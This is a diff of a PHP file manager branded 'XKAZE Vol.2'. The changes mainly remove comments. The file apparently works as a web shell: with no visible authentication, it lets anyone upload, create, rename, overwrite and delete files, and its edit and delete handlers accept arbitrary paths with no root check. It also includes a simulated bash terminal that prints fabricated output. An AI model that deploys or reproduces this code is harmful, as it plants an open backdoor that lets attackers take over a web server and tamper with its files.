@@ -1,41 +1,33 @@
 <?php
-// Root folder = folder file PHP ini berada
 $ROOT = realpath(getcwd());
 
-// Ambil path aktif
 $path = $_GET['path'] ?? $ROOT;
 $path = realpath($path);
 
-// Block keluar root (prevent path escape)
 if (!$path || strpos($path, $ROOT) !== 0) {
     $path = $ROOT;
 }
 
-// Clean helpers
 function safe($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
 
-// ====== Create Folder ======
 if (isset($_POST['newfolder']) && $_POST['newfolder'] !== "") {
     mkdir($path . "/" . basename($_POST['newfolder']));
     header("Location: ?path=$path");
     exit;
 }
 
-// ====== Create File ======
 if (isset($_POST['newfile']) && $_POST['newfile'] !== "") {
     file_put_contents($path . "/" . basename($_POST['newfile']), "");
     header("Location: ?path=$path");
     exit;
 }
 
-// ====== Upload ======
 if (!empty($_FILES['upfile']['name'])) {
     move_uploaded_file($_FILES['upfile']['tmp_name'], $path . "/" . basename($_FILES['upfile']['name']));
     header("Location: ?path=$path");
     exit;
 }
 
-// ====== Delete ======
 if (isset($_GET['delete'])) {
     $target = $_GET['delete'];
     if (is_file($target)) unlink($target);
@@ -44,7 +36,6 @@ if (isset($_GET['delete'])) {
     exit;
 }
 
-// ====== Rename ======
 if (isset($_POST['rename_from'])) {
     $old = $_POST['rename_from'];
     $new = dirname($old) . "/" . basename($_POST['rename_to']);
@@ -53,14 +44,12 @@ if (isset($_POST['rename_from'])) {
     exit;
 }
 
-// ====== Save Edit ======
 if (isset($_POST['edit_file'])) {
     file_put_contents($_POST['edit_file'], $_POST['content']);
     header("Location: ?path=" . dirname($_POST['edit_file']));
     exit;
 }
 
-// ====== List Items ======
 $items = scandir($path);
 $folders = [];
 $files = [];
@@ -83,9 +72,6 @@ if(isset($_GET['bash_cmd'])){
         exit;
     }
 
-    // -----------------------------------------------------
-    //  FULL SIMULATED BASH TERMINAL (AMAN / GAK EKSEKUSI OS)
-    // -----------------------------------------------------
      if($cmd === "id"){
     $info = posix_getpwuid(fileowner(__FILE__));
     $user = $info["name"];
@@ -96,15 +82,13 @@ if(isset($_GET['bash_cmd'])){
 }
 
 
-        $user = basename(dirname($path));
+    $user = basename(dirname($path));
     $home = dirname($path);
 
-    // whoami (auto)
     if($cmd === "whoami"){
         o($user);
     }
 
-    // pwd (auto)
     if($cmd === "pwd"){
         o($path);
     }
@@ -184,7 +168,6 @@ if(isset($_GET['bash_cmd'])){
         o("__CLEAR__");
     }
 
-    // Fake advanced commands
     if($cmd === "ps aux"){
         o("USER   PID %CPU %MEM   VSZ   RSS TTY      STAT START   TIME COMMAND
 root     1  0.0  0.1  3000  1500 ?        Ss   10:00   0:00 init
@@ -205,7 +188,6 @@ Tasks:  87 total,   1 running,  86 sleeping,   0 stopped,   0 zombie");
 PING google.com (8.8.8.8): bytes=56 ttl=117 time=23.2 ms");
     }
 
-    // Unknown command
     o("bash: $cmd: command not found");
 }
 ?>
@@ -231,7 +213,6 @@ button { cursor:pointer; }
 
 <h2>📂 XKAZE Vol.2</h2>
 
-<!-- Breadcrumb -->
 <div class="breadcrumb">
 <b>Path: </b>
 <?php
@@ -248,7 +229,6 @@ foreach ($parts as $p) {
 </div>
 <hr>
 
-<!-- CREATE FOLDER -->
 <form method="POST">
     <input type="text" name="newfolder" placeholder="Nama folder">
     <input type="hidden" name="path" value="<?= $path ?>">
@@ -263,7 +243,6 @@ if (isset($_POST['newfolder'])) {
 }
 ?>
 
-<!-- CREATE FILE -->
 <form method="POST">
     <input type="text" name="newfile" placeholder="Nama file">
     <input type="hidden" name="path" value="<?= $path ?>">
@@ -278,7 +257,6 @@ if (isset($_POST['newfile'])) {
 }
 ?>
 
-<!-- UPLOAD -->
 <form method="POST" enctype="multipart/form-data">
     <input type="file" name="upfile">
     <input type="hidden" name="path" value="<?= $path ?>">
@@ -293,7 +271,6 @@ if (!empty($_FILES['upfile']['name'])) {
 }
 ?>
 
-<!-- FILE TABLE -->
 <table>
 <tr>
     <th>Nama</th>
@@ -303,7 +280,6 @@ if (!empty($_FILES['upfile']['name'])) {
     <th>Aksi</th>
 </tr>
 
-<!-- FOLDER LIST -->
 <?php foreach($folders as $f): ?>
 <?php
     $full = $path . "/" . $f;
@@ -321,7 +297,6 @@ if (!empty($_FILES['upfile']['name'])) {
 </tr>
 <?php endforeach; ?>
 
-<!-- FILE LIST -->
 <?php foreach($files as $f): ?>
 <?php
     $full = $path . "/" . $f;
